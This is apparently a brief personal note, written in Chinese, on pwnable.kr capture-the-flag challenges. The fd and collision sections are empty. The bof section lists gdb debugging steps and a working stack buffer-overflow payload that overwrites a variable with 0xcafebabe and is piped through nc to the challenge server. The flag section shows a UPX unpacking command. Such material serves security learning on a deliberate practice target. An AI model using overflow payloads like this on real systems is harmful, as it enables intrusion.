# pwnable.kr

## fd

## collision

## bof

-   动态调试
    -   设置断点: `b main`
    -   开始运行: `r`
    -   单步调试: `n`
    -   单步步入：`s`
    -   创建一个64字节的测试 payload: `pattern create 64`
    -   查看目标地址: `p $ebp+0x8`
    -   查看地址状态: `telescope 25`
    -   故构造payload: `(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000`
-   静态调试
    -   `s=$esp+1ch`
    -   `a1=$esp+50h`
    -   `payload = 'j' * 52 + p32(key)`

## flag

-   `upx -q -d flag -ofalg_upx`
